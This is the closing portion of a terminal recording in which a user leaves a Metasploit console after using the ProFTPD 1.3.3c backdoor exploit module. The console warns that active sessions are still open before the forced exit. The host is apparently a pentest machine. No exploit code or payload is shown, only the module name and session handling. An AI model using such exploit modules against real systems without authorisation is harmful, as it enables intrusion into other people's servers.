[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> exit
[0m[1m[34m[*][0m You have active sessions open, to exit anyway type "exit -y"
[4mmsf5[0m exploit([1m[31munix/ftp/proftpd_133c_backdoor[0m) [0m> exit -y
[0m]0;root@Pentest: /home/joaofracassi/beco-xpl/violator[1;31mroot@Pentest[00m:[1;34m/home/joaofracassi/beco-xpl/violator[00m# exit
exit

Script done on 2020-09-27 10:36:57-03:00 [COMMAND_EXIT_CODE="0"]
